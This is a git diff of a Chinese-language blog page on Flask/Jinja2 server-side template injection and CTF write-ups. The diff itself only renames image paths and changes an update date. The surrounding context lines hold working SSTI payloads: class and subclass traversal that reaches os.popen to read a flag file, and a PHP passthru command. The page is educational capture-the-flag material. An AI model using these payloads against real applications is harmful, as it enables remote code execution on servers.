@@ -205,7 +205,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302221112050.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302221112050.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-13
+                    2021-03-19
                 </div>
                 
 
@@ -417,7 +417,7 @@
 <span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">"Hello,%s"</span><span class="token operator">%</span>username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302105848587.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302105848587.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>选择调试模式，以便网页实时刷新。不然每次修改得重新Run</p>
@@ -445,9 +445,9 @@
 └── templates  
     └── index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210301203932344.png" alt="设置两个要进行渲染的参数"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210301204034708.png" alt="在app.py进行渲染"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302104505677.png" alt="渲染结果"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301203932344.png" alt="设置两个要进行渲染的参数"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301204034708.png" alt="在app.py进行渲染"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302104505677.png" alt="渲染结果"></p>
 <h3 id="jinja2模板引擎特点"><a href="#jinja2模板引擎特点" class="headerlink" title="jinja2模板引擎特点"></a>jinja2模板引擎特点</h3><p><code>&#123;&#123;...&#125;&#125;</code>:装载一个变量，模板渲染的时候，会使用传进来的同名参数，这个变量的代表值被替换掉</p>
 <p><code>&#123;%...%&#125;</code>:装载一个控制语句</p>
 <p><code>&#123;#...#&#125;</code>:装载一个注释，模板渲染的时候会忽视这中间的值</p>
@@ -482,7 +482,7 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>运行：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302122802280.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302122802280.png"></p>
 <p>这里user变量已经可控了，能进行的只是传参，但不会引起代码执行。</p>
 <p>原因在于我已经写了一个index.html模板，已经固定且被render_template渲染了。</p>
 <p>所以模板渲染变得不可控了</p>
@@ -495,8 +495,8 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
     <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>传入的 <code>id</code> 直接拼接进了 html 中，直接拼接 html 会存在反射型 xss，也存在RCE</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302150511343.png" alt="XSS"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302150211089.png" alt="RCE"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302150511343.png" alt="XSS"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302150211089.png" alt="RCE"></p>
 <h3 id="Python特殊方法"><a href="#Python特殊方法" class="headerlink" title="Python特殊方法"></a>Python特殊方法</h3><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p>
 <p>每个类都有一个base属性</p>
 <p><strong>我们在进行攻击的时候，虽然当前的类可能不能让我们进行很好的攻击，但是我们可以通过寻找其父类的其他子类，最后达到攻击的目的。</strong></p>
@@ -558,7 +558,7 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 </li>
 </ul>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302210113520.png" alt="所有子类"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302210113520.png" alt="所有子类"></p>
 <h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>使用魔术方法进行解析，再获取基本类：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
 <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
@@ -588,9 +588,9 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 <span class="token punctuation">&#123;</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302212806473.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302213316451.png" alt="所有的内建函数"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302213832477.png" alt="命令执行"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302212806473.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302213316451.png" alt="所有的内建函数"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302213832477.png" alt="命令执行"></p>
 <h2 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">获得基类
 <span class="token comment">#python2.7</span>
 <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
@@ -683,12 +683,12 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 <p>这题随便传一个参数<code>?a=&#123;phpinfo()&#125;</code>发现可以执行成功</p>
 <p>审查代码发现过滤了exec和eval</p>
 <p>所以只能用passthru执行命令了<code>?a=&#123;passthru(&#39;tac /_21372&#39;)&#125;</code></p>
-<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210312093525180.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210312093620319.png"></p>
+<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210312093525180.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210312093620319.png"></p>
 <p>根据提示，可以试试修改X-Forwarded-For或者是client-ip，试了一下发现存在模板注入，直接调用系统命令就可以查看flag了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210312093807486.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210312093807486.png"></p>
 <h3 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h3><p>常规套路，直接找到flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210310222204046.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210310222204046.png"></p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.246.176:18056&#x2F;?flag&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[431].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat &#x2F;app&#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -861,7 +861,7 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
                 <a href="/2021/web/buuctf/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210224152322090.png" class="responsive-img" alt="BUU做题记录">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210224152322090.png" class="responsive-img" alt="BUU做题记录">
                         
                         <span class="card-title">BUU做题记录</span>
                     </div>
